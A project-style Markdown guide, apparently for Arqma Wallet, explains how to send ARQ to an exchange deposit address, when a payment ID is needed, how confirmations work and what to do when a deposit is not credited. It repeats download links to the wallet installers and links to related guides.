![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Sending ARQ from Arqma Wallet to an exchange</h1>

<p align="center">Moving ARQ to a venue without payment IDs, memos or a lost deposit.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-10134a?style=for-the-badge&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="https://img.shields.io/badge/platform-Windows-d6efff?style=flat-square&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

Copy the deposit address from the exchange, send from Arqma Wallet, and wait for the confirmations the exchange requires. If the balance never appears there, verify the transaction on a block explorer first: that proof is what their support team needs, and the wallet cannot reverse or resend a confirmed transfer.

## Before you send anything

Three details decide whether a deposit lands: the address, the network and the minimum. Read them on the exchange's deposit page rather than from an old message or a saved screenshot, because deposit addresses are retired and reissued.

- The address has to be complete: 95 characters beginning with `ar`.
- The exchange may set a minimum deposit; a smaller send can arrive and still not be credited.
- Any memo or reference the exchange asks for must be included exactly as given.

A deposit address is often retired when an exchange rotates its wallets, so an address saved from last year can look valid and no longer belong to you. Copy it fresh from the deposit page each time rather than reusing what is in your history.

[Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers what a valid ARQ address looks like and why a truncated paste fails immediately.

## Do you need a payment ID?

A normal ARQ send needs no payment ID  -  the address alone identifies the recipient. If an exchange asks for a reference anyway, use the one it gives you; if it asks for nothing, send nothing extra.

Adding a payment ID that was not requested is a common cause of deposits that arrive but are never credited, because the exchange has no rule for matching them.

## Sending, step by step

Send from the current release on the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2); the fee priority and confirmation screens described below come from that build.

1. Open the exchange's deposit page and copy the ARQ address.
2. In Arqma Wallet, start a send and paste the address.
3. Check the first four and last four characters against the source.
4. Enter the amount and choose the fee priority; the default suits ordinary conditions.
5. Confirm, then copy the transaction hash the wallet shows.

The hash is what ties the send to a specific transfer, and it is the reference the exchange's support team needs in order to trace one. [Arqma stuck transaction fix](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-stuck-transaction.md) explains what a slow confirmation means.

## How many confirmations before it is credited

Arqma treats ten confirmations, roughly twenty minutes at the two-minute block target, as settled. Exchanges often wait longer than that before crediting, especially for a first deposit, so a delay of an hour is not evidence of a problem.

What matters is the explorer: once the transaction shows confirmed, your side is finished and the remaining wait belongs to the exchange. Its threshold is its own policy rather than a network rule, so it can differ from one service to the next.

## If the deposit never appears

The order matters, because a second send before the first is checked creates a second deposit to explain.

1. Look up the transaction hash on a block explorer. If it is confirmed, the funds reached the address you sent to.
2. Compare the address in that transaction with the deposit address on the exchange's page, character for character.
3. Check that the amount was above the exchange's minimum.
4. Open a support ticket with the hash, the address, the amount and the time.

A confirmed transaction to the wrong address is not recoverable by anyone, which is why step two matters more than the rest.

## When the wallet is not at fault

Some deposit problems have nothing to do with the send. The exchange may have retired that deposit address, may be rescanning its own wallet, or may be holding the credit for a compliance check it has not told you about.

None of those are visible from your side, and none of them are fixed by sending again. The useful next step is the ticket with the hash, and a second send would only create a second problem to explain.

If the wallet itself is behind the chain, the send may be confirmed while the wallet has not seen it yet  -  [Arqma Wallet not syncing fix](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-not-syncing.md) covers that case.

## Why the send cannot be undone

ARQ transfers are final. The wallet has no reversal, the project has no override, and an exchange cannot pull a confirmed transaction back. That is a property of the network rather than a limitation of the software, and it is the reason every check happens before the send rather than after. The confirmation screen exists for that purpose: it is the last point at which the address can be read rather than remembered.

[Arqma wallet scam guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-scams-fake-support.md) is worth reading if someone contacts you offering to reverse or recover a transfer  -  that offer does not exist.

## Getting ARQ to send in the first place

If the deposit question is really a question about acquiring ARQ, the route is mining or an atomic swap rather than a conventional exchange order book. [where to buy ARQ](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-buy-arq.md) sets out what the market actually looks like, and [Arqma atomic swap guide](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-atomic-swap.md) covers the swap path.

## What happens between the send and the credit

The transaction is broadcast, included in a block, and confirmed further with each new block. The exchange watches its deposit address, matches the incoming output, and credits the account once its own threshold is met.

Every step after broadcast belongs to the exchange, which is why the useful question is never "did my wallet send it" but "has the exchange seen it".

## Reading a deposit page correctly

A deposit page states an address, a network and often a minimum, and those three belong together: an address used without its minimum can produce a deposit that arrives and is never credited.

The page also changes over time, because addresses are reissued when a service rotates wallets. A saved copy is a statement about the past, and the page is the statement about now.

## What to keep after the send

Keep the hash, the amount, the deposit address and the time until the exchange shows the credit. If a first deposit is held for review, that set is exactly what their support asks for, and it is the difference between a ticket that resolves and one that goes back and forth for a week.

The exchange's own history is the page in question, so the record that settles it is the one held outside that page.

## FAQ

### Do I need a payment ID to deposit to an exchange?

Only if that exchange asks for one. A normal ARQ send needs just the address.

### How long should an exchange deposit take?

The transaction confirms in about twenty minutes at ten confirmations; the exchange's own crediting can take longer, especially on a first deposit.

### The exchange says it never received my deposit. What do I send them?

The transaction hash, the deposit address, the amount and the time. A confirmed transaction plus a matching address is the evidence they need to trace it.

### Can the transaction be cancelled if I used the wrong address?

No. ARQ sends are final, and an address that is not yours is not recoverable by the wallet or the project.

### Why did my deposit arrive but not get credited?

Usually a minimum-deposit rule, a retired address or a missing reference. The funds are at the address; the exchange's support team is the only party that can credit them.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-10134a?style=for-the-badge&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="https://img.shields.io/badge/platform-Windows-d6efff?style=flat-square&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma stuck transaction fix](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-stuck-transaction.md) | A pending send, its fee and confirmation, and when to stop waiting. |
| [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) | Why an ARQ address is 95 characters and where the prefixes come from. |
| [where to buy ARQ](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-buy-arq.md) | Where ARQ trades today and how to read a thin market before buying. |
